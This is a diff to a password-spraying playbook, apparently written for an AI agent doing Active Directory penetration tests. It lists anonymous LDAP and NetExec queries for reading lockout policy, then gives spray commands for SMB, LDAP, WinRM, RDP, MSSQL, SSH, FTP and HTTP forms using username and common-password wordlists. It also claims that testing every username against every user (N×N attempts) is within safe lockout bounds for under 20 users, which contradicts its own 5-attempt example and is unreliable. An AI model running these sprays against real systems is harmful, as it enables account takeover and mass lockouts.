@@ -105,21 +105,41 @@ knowing the lockout threshold risks locking out accounts.
 
 ### From Linux (Unauthenticated)
 
+**Primary — LDAP anonymous query** (most reliable, returns structured data):
+
 ```bash
-# NetExec — null session or guest
+# Query lockout + password attributes from domain root object
+ldapsearch -x -H ldap://DC01.DOMAIN.LOCAL -b "DC=DOMAIN,DC=LOCAL" -s base \
+  '(objectClass=*)' lockoutThreshold lockOutObservationWindow \
+  lockoutDuration minPwdLength pwdProperties
+```
+
+Returns integer values directly:
+- `lockoutThreshold: 0` = no lockout (spray freely)
+- `lockoutThreshold: 5` = 5 attempts before lockout
+- Duration/window values are negative 100ns intervals — divide abs(value) by
+  600,000,000 to get minutes (e.g., `-18000000000` = 30 minutes)
+
+Requires anonymous LDAP bind (common on misconfigured DCs).
+
+**Secondary — NetExec SAMR query** (human-readable output):
+
+```bash
 nxc smb DC01.DOMAIN.LOCAL -u '' -p '' --pass-pol
 nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --pass-pol
-
-# enum4linux
-enum4linux -u '' -p '' -P DC01.DOMAIN.LOCAL
-
-# rpcclient
-rpcclient -U "" -N DC01.DOMAIN.LOCAL -c "querydominfo"
-
-# LDAP search
-ldapsearch -h DC01.DOMAIN.LOCAL -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" \
-  | grep -m 1 -B 10 pwdHistoryLength
 ```
+
+Look for "Account Lockout Threshold" in the output. "None" = 0 = no lockout.
+
+**Tertiary — enum4linux-ng** (modern Python rewrite of enum4linux):
+
+```bash
+enum4linux-ng -P DC01.DOMAIN.LOCAL
+```
+
+**Note on rpcclient:** `rpcclient -c "getdompwinfo"` returns min password
+length and password properties only — it does NOT return lockout threshold,
+observation window, or lockout duration. Do not rely on it for lockout policy.
 
 ### From Linux (Authenticated)
 
@@ -211,10 +231,8 @@ passwords the agent may generate. **Do NOT invent, guess, or improvise
 passwords beyond these patterns.**
 
 **Do NOT include usernames in wordlist.txt.** Username-as-password is handled
-separately in Round 1 with special 1:1 `--no-bruteforce` matching. Putting
-usernames in wordlist.txt would cross-spray them against every user in Round 2
-(user A's name tested as password for user B), which is noisy and rarely
-productive.
+in Round 1 by passing `usernames.txt` as both the user and password file.
+Adding usernames to wordlist.txt would redundantly re-test them in Round 2.
 
 **Patterns to include (substitute real values from context):**
 
@@ -307,24 +325,17 @@ one service before moving to the next.
 
 ### Round 1: Username-as-Password (per service)
 
-Each user is tested only with their OWN username as the password (original
-case + lowercase). This requires special `--no-bruteforce` handling for 1:1
-line matching.
+Use the usernames file as both the user list and the password list:
 
 ```bash
-# Generate matched user/pass files for 1:1 testing
-cp engagement/evidence/usernames.txt /tmp/uap-pass.txt
-tr '[:upper:]' '[:lower:]' < engagement/evidence/usernames.txt >> /tmp/uap-pass.txt
-cat engagement/evidence/usernames.txt engagement/evidence/usernames.txt > /tmp/uap-users.txt
-
-# Spray with 1:1 matching
-nxc smb TARGET -u /tmp/uap-users.txt -p /tmp/uap-pass.txt \
-  --no-bruteforce --continue-on-success -d DOMAIN
+nxc smb TARGET -u engagement/evidence/usernames.txt \
+  -p engagement/evidence/usernames.txt \
+  --continue-on-success -d DOMAIN
 ```
 
-**Why `--no-bruteforce` here:** Ensures line-by-line matching — user1 is
-tested with pass1, user2 with pass2. This is correct for username-as-password
-where each password is unique to its user.
+This tests every username as a password against every user (N×N attempts).
+For typical user lists (<20 users), this is well within safe lockout bounds
+and catches cases where users set another user's name as their password.
 
 **If any hit is found:** Record it, note which user/password, and continue
 spraying remaining rounds (other users may also have weak passwords).
@@ -336,7 +347,7 @@ Standard spray — every password tested against all users:
 ```bash
 nxc smb TARGET -u engagement/evidence/usernames.txt \
   -p engagement/evidence/wordlist.txt \
-  --no-bruteforce --continue-on-success -d DOMAIN
+  --continue-on-success -d DOMAIN
 ```
 
 ### Round 3: SecLists Wordlist (per service, tier-dependent)
@@ -347,17 +358,17 @@ Same approach, pointing to the tier-appropriate SecLists file:
 # Light tier
 nxc smb TARGET -u engagement/evidence/usernames.txt \
   -p /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
-  --no-bruteforce --continue-on-success -d DOMAIN
+  --continue-on-success -d DOMAIN
 
 # Medium tier
 nxc smb TARGET -u engagement/evidence/usernames.txt \
   -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-  --no-bruteforce --continue-on-success -d DOMAIN
+  --continue-on-success -d DOMAIN
 
 # Heavy tier
 nxc smb TARGET -u engagement/evidence/usernames.txt \
   -p /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
-  --no-bruteforce --continue-on-success -d DOMAIN
+  --continue-on-success -d DOMAIN
 ```
 
 ### Service Protocol Commands
@@ -367,22 +378,22 @@ for protocols netexec does not support.
 
 ```bash
 # SMB (most common)
-nxc smb TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success -d DOMAIN
+nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN
 
 # LDAP
-nxc ldap TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success
 
 # WinRM (if 5985/5986 open)
-nxc winrm TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+nxc winrm TARGET -u USERFILE -p PASSFILE --continue-on-success
 
 # RDP
-nxc rdp TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+nxc rdp TARGET -u USERFILE -p PASSFILE --continue-on-success
 
 # MSSQL
-nxc mssql TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+nxc mssql TARGET -u USERFILE -p PASSFILE --continue-on-success
 
 # SSH
-nxc ssh TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+nxc ssh TARGET -u USERFILE -p PASSFILE --continue-on-success
 
 # FTP (hydra — nxc does not support FTP)
 hydra -L USERFILE -P PASSFILE ftp://TARGET -u -t 4 -o spray-ftp.log
@@ -394,10 +405,15 @@ hydra -L USERFILE -P PASSFILE TARGET http-post-form \
 ```
 
 **Critical flags:**
-- `--no-bruteforce` — spray mode (one password per user, then next password).
-  Without this, netexec tests all passwords per user = lockout risk.
 - `--continue-on-success` — don't stop at first valid credential.
 - `-d DOMAIN` — for domain-joined services (SMB, WinRM). Omit for local auth.
+
+**Do NOT use `--no-bruteforce`** for spray rounds. Despite its name,
+`--no-bruteforce` does line-by-line matching (user1:pass1, user2:pass2) — if
+the password file is longer than the user file, extra passwords are silently
+skipped. Without it, nxc tests all combinations (every password against every
+user), which is what spray mode requires. Use lockout-aware pacing (below)
+to stay safe.
 
 ## Lockout-Aware Spray Pacing
 
